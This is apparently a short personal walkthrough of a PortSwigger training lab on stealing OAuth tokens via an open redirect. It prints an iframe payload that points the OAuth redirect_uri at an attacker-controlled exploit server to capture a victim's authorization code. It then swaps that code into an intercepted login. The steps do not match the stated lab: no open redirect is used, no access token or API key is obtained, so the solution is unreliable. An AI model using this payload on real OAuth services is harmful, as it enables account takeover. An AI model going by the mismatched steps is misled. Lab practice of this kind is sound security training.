https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect

This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.

To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.



1) perform the login with wiener:peter and notice https://oauth-0a3400d70333582686f03dc3020e0042.oauth-server.net/auth?client_id=k1cvqk8g6xx4n4nadfz7r&redirect_uri=https://0a9500fe0350585886893f4d00be00f8.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email

        there is no state field (no CSRF protection)

2) create an exploit :

<iframe src="https://oauth-0a3400d70333582686f03dc3020e0042.oauth-server.net/auth?client_id=k1cvqk8g6xx4n4nadfz7r&redirect_uri=https://exploit-0aa100b203d958d8863a3ef201c700ad.exploit-server.net/exploited_values&response_type=code&scope=openid%20profile%20email"> </iframe>

So when the victim sends this request to the OAuth server, the server will send to our malicious website the authentication code


3) get the code from the exploit server logs

4) use intercept on Burp and perform the login, in the request GET /oauth-callback?code=3T2kAgN9aVUUDAWPPn0aeE96_XRGbf_svXX6qMN7eDl
        change the current code with the one stolen


DONE!!!
